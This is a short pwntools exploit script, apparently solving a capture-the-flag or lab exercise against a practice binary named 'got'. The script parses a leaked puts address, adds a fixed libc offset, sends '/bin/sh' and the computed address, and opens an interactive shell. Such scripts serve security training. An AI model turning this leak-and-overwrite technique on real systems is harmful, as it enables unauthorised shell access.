#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/got'

e = ELF('./build/got')
rop = ROP('./build/got')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5001)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/got', cwd='problemDir')
else:
    p = e.process()

p.recvline()
p.recvline()
puts = p.recvline()
puts = puts[puts.rindex(b' ')+1:-1]
puts = int(puts, 16)

offset = 0x55410 - 0x875a0

print(hex(puts))

puts += offset

print(hex(puts))


p.sendline(b'/bin/sh')

p.sendline('0')
p.sendline(bytes(str(puts),"ascii"))

p.interactive()
